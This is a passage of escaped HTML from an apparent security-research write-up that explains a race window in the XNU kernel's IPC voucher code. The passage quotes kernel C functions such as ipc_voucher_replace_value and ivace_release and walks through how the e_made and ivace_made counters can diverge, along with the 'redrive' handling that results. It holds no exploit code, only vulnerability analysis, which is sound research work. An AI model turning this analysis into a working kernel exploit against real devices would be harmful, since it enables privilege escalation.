class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;else&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;They grab the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;#39;s lock again and recalculate a pointer to the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;(because the table could have been reallocated while the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;lock was dropped, and only the index into the table would be valid, not a pointer.)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Then things get really weird; if &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace-&amp;gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;isn&amp;#39;t equal to &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;made&lt;/span&gt;&lt;span&gt;&amp;nbsp;but &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_release_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;did return &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;KERN_SUCCESS&lt;/span&gt;&lt;span&gt;, then they subtract the old value of &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;from the current value of &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_made&lt;/span&gt;&lt;span&gt;, and if &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_refs&lt;/span&gt;&lt;span&gt;&amp;nbsp;is &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;0&lt;/span&gt;&lt;span&gt;, they use a &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;goto&lt;/span&gt;&lt;span&gt;&amp;nbsp;statement to try to free the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_value_element&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;again?&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;If that makes complete sense to you at first glance then give yourself a gold star! Because to me at first that logic was completely impenetrable. We will get to the bottom of it though.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;We need to ask the question: under what circumstances will &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;and the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;#39;s &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;field ever be different? To answer this we need to look back at &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ipc_voucher_replace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;where the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;are actually allocated:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.6678b43a7a459c004d346e8b4b835a591c986cfd"&gt;&lt;/a&gt;&lt;a id="t.48"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivam&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivam_get_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)(&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivam&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;key&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;command&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; previous_vals&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;previous_vals_count&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; content&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;new_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;new_flag&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;new_value_voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;!=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_release&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;...&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* &lt;/span&gt;&lt;span class="BGLtzooHlW-c7 BGLtzooHlW-c23"&gt;WINDOW&lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp;*/&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; val_index &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivace_reference_by_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;new_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;new_flag&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c19 BGLtzooHlW-c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;We already looked at this code; if you can&amp;#39;t remember what &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivam_get_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_reference_by_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;are meant to do, I&amp;#39;d suggest going back and looking at those sections again.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Firstly, &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ipc_voucher_replace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;itself isn&amp;#39;t holding any locks. It does however hold a few references (e.g., on the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivam&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;.)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_get_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;(the value of &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivam-&amp;gt;ivam_get_value&lt;/span&gt;&lt;span&gt;) only takes the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;lock (and not in all paths; we&amp;#39;ll get to that) and &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_reference_by_value&lt;/span&gt;&lt;span&gt;, which increments &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace-&amp;gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;does that under the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;lock.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;should therefore &lt;/span&gt;&lt;span class="BGLtzooHlW-c17"&gt;always&lt;/span&gt;&lt;span&gt;&amp;nbsp;get incremented before any corresponding &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;#39;s &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;field. And there is a small window (marked as &lt;/span&gt;&lt;span class="BGLtzooHlW-c23"&gt;WINDOW&lt;/span&gt;&lt;span&gt;&amp;nbsp;above) where &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;will be &lt;/span&gt;&lt;span class="BGLtzooHlW-c17"&gt;larger&lt;/span&gt;&lt;span&gt;&amp;nbsp;than the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;field of the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;which will end up with a pointer to the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;. If, in exactly that window shown above, another thread grabs the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;#39;s lock and drops the last reference (&lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_refs&lt;/span&gt;&lt;span&gt;) on the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;which currently points to that &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;then we&amp;#39;ll encounter one of the more complex situations outlined above where, in &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_release&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is &lt;/span&gt;&lt;span class="BGLtzooHlW-c17"&gt;not&lt;/span&gt;&lt;span&gt;&amp;nbsp;equal to the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;#39;s &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;field. The reason that there is special treatment of that case is that it&amp;#39;s indicating that there is a live pointer to the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;which isn&amp;#39;t yet accounted for by the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace&lt;/span&gt;&lt;span&gt;, and therefore it&amp;#39;s not valid to free the &lt;/span&gt;&lt;span class="BGLtzooHlW-c19 BGLtzooHlW-c11"&gt;user_data_value_element.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;Another way to view this is that it&amp;#39;s a hack around not holding a lock across that window shown above.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;With this insight we can start to unravel the &amp;quot;redrive&amp;quot; logic:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c19 BGLtzooHlW-c11"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.1c71158a8af57bb6d3e831d618708883a379cc86"&gt;&lt;/a&gt;&lt;a id="t.49"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_made &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;!=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_made &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_refs&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;goto&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;redrive&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_releasing &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;else&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/*&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* If the manager returned FAILURE, someone took a&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* reference on the value but have not updated the ivace,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* release the lock and return since thread who got&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* the new reference will update the ivace and will have&lt;/span&gt;&lt;/p&gt; &lt;p 